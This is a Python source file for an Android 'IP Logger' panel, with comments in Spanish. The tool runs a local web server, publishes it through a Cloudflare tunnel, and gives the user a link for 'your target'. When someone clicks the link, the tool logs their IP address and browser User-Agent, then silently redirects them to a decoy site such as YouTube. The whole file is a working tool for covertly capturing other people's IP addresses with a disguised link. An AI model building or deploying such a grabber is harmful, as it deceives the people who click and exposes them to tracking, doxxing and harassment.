# -*- coding: utf-8 -*-
"""
IP Logger - Panel automatizado (edición Android)
Adaptación del proyecto original de Termux: kravox-tool/ip-tracker
"""

import os
import sys
import time
import queue
import threading
import subprocess
from datetime import datetime

# ------------------------------------------------------------------ colores
V = "\033[92m"   # verde
A = "\033[94m"   # azul
M = "\033[93m"   # amarillo
R = "\033[91m"   # rojo
C = "\033[96m"   # cyan
B = "\033[1m"    # negrita
N = "\033[0m"    # reset

BANNER_BIG = """
██╗██████╗░  ██╗░░░░░░█████╗░░██████╗░░███████╗███████╗██████╗
██║██╔══██╗  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
██║██████╔╝  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██║██╔═══╝░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║██║░░░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
╚═╝╚═╝░░░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
"""

BANNER_SMALL = """
╔════════════════════════════════╗
║   I P   L O G G E R            ║
║   Panel IP Logger · Android    ║
╚════════════════════════════════╝
"""

AYUDA = """
""" + B + """Comandos disponibles:""" + N + """
  link / enlace  Muestra el enlace público del túnel
  logs           Muestra el historial de IPs capturadas
  clear          Limpia la pantalla
  salir / exit   Detiene el túnel y cierra el panel
"""

# ---------------------------------------------------------------- estado
BRIDGE = None
STDIN = None
OUT = None
PROC = None
CLOUDFLARED = ""
DATA_DIR = "."
TARGET = "https://www.youtube.com"
PUBLIC_URL = ""
COLS = 80
ROWS = 24
RUNNING = True
USANDO_JAVA_CF = False

try:
    from flask import Flask, request, redirect
    HAS_FLASK = True
except Exception:
    HAS_FLASK = False


# ------------------------------------------------------------- stream I/O
class TermOut(object):
    def __init__(self, bridge):
        self._b = bridge

    def write(self, s):
        if not s:
            return 0
        try:
            self._b.write(s)
        except Exception:
            pass
        return len(s)

    def flush(self):
        pass

    def isatty(self):
        return False


class TermIn(object):
    def __init__(self):
        self._q = queue.Queue()

    def push(self, line):
        self._q.put(line)

    def readline(self, *a):
        try:
            return self._q.get() + "\n"
        except Exception:
            return "\n"

    def read(self, *a):
        return self.readline()

    def flush(self):
        pass

    def isatty(self):
        return False


def clear():
    if OUT:
        OUT.write("\033[2J\033[3J\033[H")


def ask(prompt):
    if OUT:
        OUT.write(prompt)
    return STDIN.readline().rstrip("\r\n").strip()


# -------------------------------------------------------------- registros
def registrar(ip, ua):
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(os.path.join(DATA_DIR, "registro_ips.txt"), "a", encoding="utf-8") as f:
            f.write("Fecha: %s | IP: %s | Agente: %s\n" % (fecha, ip, ua))
    except Exception:
        pass

    print("")
    print(C + "┌────────────────────────────────────────────────┐" + N)
    print(C + "│" + N + "  " + B + R + "🔔 ¡ALERTA! NUEVA CONEXIÓN DETECTADA" + N)
    print(C + "├────────────────────────────────────────────────┤" + N)
    print(C + "│" + N + "  " + B + "⏰ Fecha:" + N + " " + fecha)
    print(C + "│" + N + "  " + B + "🌐 IP:   " + N + B + V + ip + N)
    print(C + "│" + N + "  " + B + "📱 Agente:" + N + " " + A + ua[:44] + N)
    print(C + "└────────────────────────────────────────────────┘" + N)


# ---------------------------------------------------------------- servidor
def _servir_flask():
    app = Flask("iplogger")

    @app.route("/")
    def _root():
        fwd = request.headers.getlist("X-Forwarded-For")
        ip = str(fwd[0]).split(",")[0].strip() if fwd else str(request.remote_addr)
        ua = request.headers.get("User-Agent", "Desconocido")
        registrar(ip, ua)
        return redirect(TARGET, code=302)

    @app.route("/favicon.ico")
    def _fav():
        return ("", 204)

    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    app.run(host="0.0.0.0", port=5000, threaded=True, debug=False, use_reloader=False)


def _servir_httpd():
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith("/favicon.ico"):
                self.send_response(204)
                self.end_headers()
                return
            fwd = self.headers.get("X-Forwarded-For", "")
            ip = fwd.split(",")[0].strip() if fwd else self.client_address[0]
            ua = self.headers.get("User-Agent", "Desconocido")
            registrar(ip, ua)
            self.send_response(302)
            self.send_header("Location", TARGET)
            self.end_headers()

        def log_message(self, *a):
            pass

    ThreadingHTTPServer(("0.0.0.0", 5000), Handler).serve_forever()


def run_server():
    try:
        if HAS_FLASK:
            _servir_flask()
        else:
            _servir_httpd()
    except Exception as e:
        print(R + "[-] Error del servidor web: %s" % e + N)


# ------------------------------------------------------------------ túnel
def _tunel_subprocess():
    global PROC
    if not CLOUDFLARED or not os.path.exists(CLOUDFLARED):
        return ""
    try:
        os.chmod(CLOUDFLARED, 0o755)
    except Exception:
        pass

    env = dict(os.environ)
    env["HOME"] = DATA_DIR
    try:
        PROC = subprocess.Popen(
            [CLOUDFLARED, "tunnel", "--no-autoupdate", "--url", "http://127.0.0.1:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            bufsize=1,
            env=env,
            cwd=DATA_DIR,
        )
    except Exception as e:
        print(M + "[i] subprocess no disponible (%s), probando vía Java..." % e + N)
        return ""

    cola = queue.Queue()

    def _lector():
        try:
            for linea in PROC.stdout:
                cola.put(linea)
        except Exception:
            pass

    threading.Thread(target=_lector, daemon=True).start()

    limite = time.time() + 60
    while time.time() < limite:
        try:
            linea = cola.get(timeout=1)
        except queue.Empty:
            continue
        if "trycloudflare.com" in linea:
            for palabra in linea.replace("|", " ").split():
                if "trycloudflare.com" in palabra:
                    return palabra.strip().strip('"').replace("window.", "")
    return ""


def _tunel_java():
    global USANDO_JAVA_CF
    try:
        url = BRIDGE.runCloudflared("http://127.0.0.1:5000", DATA_DIR)
        if url:
            USANDO_JAVA_CF = True
        return url or ""
    except Exception as e:
        print(R + "[-] Falló también el plan B: %s" % e + N)
        return ""


def start_tunnel():
    url = _tunel_subprocess()
    if not url:
        url = _tunel_java()
    return url


# ------------------------------------------------------------------ panel
def mostrar_panel():
    print(C + "=" * 58 + N)
    print("📡 " + B + V + "SISTEMA DE MONITOREO IP LOGGER ACTIVO" + N)
    print(C + "=" * 58 + N)
    print("🔗 " + B + "Destino final (carnada):" + N + " " + M + TARGET + N)
    print("🎯 " + B + "LINK PARA TU OBJETIVO:  " + N + B + C + PUBLIC_URL + N)
    print(C + "=" * 58 + N)
    print(M + "⏳ Esperando clics... escribe 'ayuda' para ver comandos." + N)


# ------------------------------------------------------------ API de Kotlin
def push_line(line):
    if STDIN is not None:
        STDIN.push(line)


def set_size(cols, rows):
    global COLS, ROWS
    try:
        COLS = int(cols)
        ROWS = int(rows)
    except Exception:
        pass


def shutdown():
    global RUNNING
    RUNNING = False
    try:
        if STDIN:
            STDIN.push("salir")
    except Exception:
        pass
    try:
        if PROC:
            PROC.terminate()
    except Exception:
        pass
    try:
        if USANDO_JAVA_CF and BRIDGE:
            BRIDGE.stopCloudflared()
    except Exception:
        pass


# ------------------------------------------------------------------- main
def main(bridge, data_dir, cloudflared_path, cols=80, rows=24):
    global BRIDGE, STDIN, OUT, DATA_DIR, CLOUDFLARED, COLS, ROWS, TARGET, PUBLIC_URL

    BRIDGE = bridge
    DATA_DIR = data_dir
    CLOUDFLARED = cloudflared_path
    COLS = int(cols) if cols else 80
    ROWS = int(rows) if rows else 24

    OUT = TermOut(bridge)
    STDIN = TermIn()
    sys.stdout = OUT
    sys.stderr = OUT
    sys.stdin = STDIN

    try:
        os.chdir(data_dir)
    except Exception:
        pass
    os.environ["HOME"] = data_dir
    os.environ["TMPDIR"] = data_dir

    # ---- bienvenida
    clear()
    print(C + (BANNER_BIG if COLS >= 76 else BANNER_SMALL) + N)
    print(M + B + "   --- Panel Automatizado IP Logger para Android ---" + N)
    print("")
    print("🗂️  Datos guardados en: " + A + os.path.join(data_dir, "registro_ips.txt") + N)
    print("")

    # ---- enlace carnada
    objetivo = ask("🔗 " + B + "Pega el enlace de destino final (ej. YouTube): " + N)
    if not objetivo:
        objetivo = "https://www.youtube.com"
    if not objetivo.startswith(("http://", "https://")):
        objetivo = "https://" + objetivo
    TARGET = objetivo

    # ---- túnel
    print("")
    print(C + "[*] Conectando con los servidores de Cloudflare... espera." + N)
    url = start_tunnel()

    if url:
        print(V + "[+] ¡Túnel establecido exitosamente con Cloudflare!" + N)
    else:
        print(R + "[-] No se obtuvo enlace público. Usando acceso local." + N)
        url = "http://127.0.0.1:5000"
    PUBLIC_URL = url

    # ---- servidor
    threading.Thread(target=run_server, daemon=True).start()
    time.sleep(1.2)

    clear()
    print(C + (BANNER_BIG if COLS >= 76 else BANNER_SMALL) + N)
    mostrar_panel()

    try:
        BRIDGE.clipboard(PUBLIC_URL)
        print("📋 " + V + "Enlace copiado al portapapeles." + N)
    except Exception:
        pass

    # ---- bucle de comandos
    while RUNNING:
        print("")
        cmd = ask(B + "ip-logger> " + N).lower()

        if cmd == "":
            continue
        if cmd in ("salir", "exit", "quit", "q"):
            break
        if cmd in ("link", "enlace"):
            print(M + "[i] Enlace público: " + N + C + PUBLIC_URL + N)
            print("[i] Destino: " + TARGET)
            try:
                BRIDGE.clipboard(PUBLIC_URL)
            except Exception:
                pass
        elif cmd in ("logs", "registros"):
            try:
                with open(os.path.join(DATA_DIR, "registro_ips.txt"), encoding="utf-8") as f:
                    contenido = f.read().strip()
                print("")
                print(contenido if contenido else "[i] Aún no hay registros.")
            except Exception:
                print("[i] Aún no hay registros todavía.")
        elif cmd in ("clear", "cls"):
            clear()
            mostrar_panel()
        elif cmd in ("ayuda", "help", "?"):
            print(AYUDA)
        else:
            print(R + "[-] Comando desconocido. Escribe 'ayuda'." + N)

    # ---- apagado
    print("")
    print(M + "[*] Deteniendo túneles y limpiando memoria..." + N)
    try:
        if PROC:
            PROC.terminate()
    except Exception:
        pass
    try:
        if USANDO_JAVA_CF and BRIDGE:
            BRIDGE.stopCloudflared()
    except Exception:
        pass
    print(V + "[+] Todo cerrado. Gracias por usar IP Logger." + N)
